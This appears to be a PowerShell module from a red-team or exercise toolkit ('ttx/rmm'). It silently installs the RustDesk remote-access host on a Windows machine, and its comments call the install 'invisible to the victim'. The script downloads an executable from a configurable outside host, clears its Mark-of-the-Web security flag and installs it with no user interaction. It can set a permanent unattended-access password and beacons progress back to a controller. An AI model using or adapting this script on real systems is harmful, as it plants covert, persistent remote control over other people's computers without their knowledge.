# ttx/rmm/rustdesk/install.ps1 - RustDesk host, SILENT variant
# Dot-sourced by rmm.ps1 (the tool-agnostic loader): $Base, $BeaconUrl, $Log
# and the Beacon() function are already in scope when this runs.
#
# Downloads rustdesk-host.exe and installs it with --silent-install.
# No wizard - the install is invisible to the victim.

$Url   = "$Base/rmm/rustdesk/rustdesk-host.exe"
$File  = "$env:PUBLIC\rustdesk-host.exe"
$Check = 'rustdesk'
$Desc  = 'RustDesk host (silent)'

# Optional deployment settings - edit these per deployment:
#   ConfigString : encrypted config string from a RustDesk Server Pro console
#                 (rustdesk.com/docs -> Client -> Configuring RustDesk)
#   Password     : permanent unattended-access password
$ConfigString = ''
$Password     = ''

# Already running? done.
if (Get-Process -Name $Check -ErrorAction SilentlyContinue) {
  Add-Content $Log "$(Get-Date -f s)  already running, exiting"
  Beacon 'rustdesk-already-running'
  return
}

# Download if not present + clear MOTW
if (-not (Test-Path $File)) {
  Invoke-WebRequest -Uri $Url -OutFile $File -UseBasicParsing
  Add-Content $Log "$(Get-Date -f s)  downloaded $Url"
}
Unblock-File $File

if (-not (Test-Path $File)) {
  Beacon 'rustdesk-download-failed'
  Add-Content $Log "$(Get-Date -f s)  ERROR: downloaded exe missing"
  return
}

# SILENT INSTALL - no user interaction
Beacon 'rustdesk-install-launch'
$RdArgs = @('--silent-install')
if ($ConfigString) { $RdArgs += @('--config', $ConfigString) }
if ($Password)     { $RdArgs += @('--password', $Password) }
Start-Process $File -ArgumentList $RdArgs
Add-Content $Log "$(Get-Date -f s)  launched $Desc (silent), args: $($RdArgs -join ' ')"

# Poll for the service to come up
$Running = $false
for ($i = 0; $i -lt 36; $i++) {
  Start-Sleep -Seconds 10
  if (Get-Process -Name $Check -ErrorAction SilentlyContinue) { $Running = $true; break }
}
if ($Running) {
  Beacon 'rustdesk-installed'
  Add-Content $Log "$(Get-Date -f s)  rustdesk running (get the ID with: rustdesk.exe --get-id)"
} else {
  Beacon 'rustdesk-notready'
  Add-Content $Log "$(Get-Date -f s)  service did not come up within 6 min"
}
